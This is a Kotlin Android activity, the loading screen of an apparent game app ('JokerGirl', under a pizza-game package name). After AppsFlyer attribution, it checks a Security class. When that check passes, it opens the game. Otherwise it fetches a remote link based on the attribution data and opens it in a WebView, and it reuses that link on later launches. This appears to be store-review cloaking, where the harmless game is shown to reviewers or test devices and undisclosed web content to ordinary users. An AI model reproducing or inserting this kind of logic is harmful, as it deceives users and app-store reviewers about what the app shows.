package com.tapblaze.pizzabus.views

import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.datastore.core.DataStore
import androidx.datastore.dataStore
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib
import com.tapblaze.pizzabus.data.JokerGirlPreferences
import com.tapblaze.pizzabus.data.JokerGirlSerializer
import com.tapblaze.pizzabus.data.ProtoRepository
import com.tapblaze.pizzabus.databinding.LoadingJokerGirlBinding
import com.tapblaze.pizzabus.other.AppsFlyerConversionListenerWrapper
import com.tapblaze.pizzabus.other.Const
import com.tapblaze.pizzabus.other.Security
import com.tapblaze.pizzabus.view_models.JokerGirlViewModel
import com.tapblaze.pizzabus.view_models.JokerGirlViewModelFactory
import kotlinx.coroutines.launch

private const val PROTO_FILE_NAME = "joker_girl_prefs.proto"

val Context.jokerGirlPreferencesStore: DataStore<JokerGirlPreferences> by dataStore(
    fileName = PROTO_FILE_NAME,
    serializer = JokerGirlSerializer
)

class JokerGirlLoading : AppCompatActivity() {

    private var _loadingJokerGirlBinding: LoadingJokerGirlBinding? = null
    private val loadingJokerGirlBinding get() = _loadingJokerGirlBinding!!
    private val jokerGirlViewModel by viewModels<JokerGirlViewModel> {
        JokerGirlViewModelFactory(application, ProtoRepository(jokerGirlPreferencesStore))
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _loadingJokerGirlBinding = LoadingJokerGirlBinding.inflate(layoutInflater)
        val view = loadingJokerGirlBinding.root
        setContentView(view)

        AppsFlyerLib.getInstance().init(
            Const.APPS_DEV_KEY,
            AppsFlyerConversionListenerWrapper { appData ->
                if (Security(resources, contentResolver).isSecurityEnabled()) {
                    val intent = Intent(this@JokerGirlLoading, JokerGirlGame::class.java)
                    startActivity(intent)
                    finish()
                } else {
                    lifecycleScope.launch {
                        if (jokerGirlViewModel.isLaunchedEarlier()) {
                            startWebView(jokerGirlViewModel.currentLink())
                        } else {
                            jokerGirlViewModel.fetchLink(appData)
                            jokerGirlViewModel.flowLink.collect {
                                if (it.isNotEmpty()) {
                                    startWebView(it)
                                }
                            }
                        }
                    }
                }
            },
            this
        )
        AppsFlyerLib.getInstance().start(this)
    }

    private fun startWebView(currentLink: String) {
        with(Intent(this, JokerGirlWeb::class.java)) {
            putExtra(Const.EXTRA_LINK, currentLink)
            startActivity(this)
            finish()
        }
    }

    override fun onStart() {
        super.onStart()
        loadingJokerGirlBinding.newtonCradleLoading.setLoadingColor(Color.RED)
        loadingJokerGirlBinding.newtonCradleLoading.start()
    }

    override fun onStop() {
        super.onStop()
        loadingJokerGirlBinding.newtonCradleLoading.stop()
    }

    override fun onDestroy() {
        super.onDestroy()
        _loadingJokerGirlBinding = null
    }

}